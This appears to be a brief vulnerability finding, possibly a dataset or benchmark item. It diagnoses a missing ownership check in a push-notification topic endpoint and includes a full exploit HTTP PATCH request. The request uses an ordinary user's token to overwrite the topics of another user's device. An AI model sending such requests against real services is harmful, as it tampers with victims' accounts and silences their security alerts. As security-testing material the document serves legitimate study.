diagnosis: DeviceTopicSubscriptionView updates push notification channel topics on GCMDevice by primary key without verifying user ownership. Any authenticated user can modify notification preferences or unsubscribe victim devices from critical transaction and security channels.
exploit_request:
PATCH /api/notifications/devices/882/topics/ HTTP/1.1
Host: push.appcore.io
Authorization: Token regular_user_token
Content-Type: application/json

{"topics": ["marketing_spam"]}
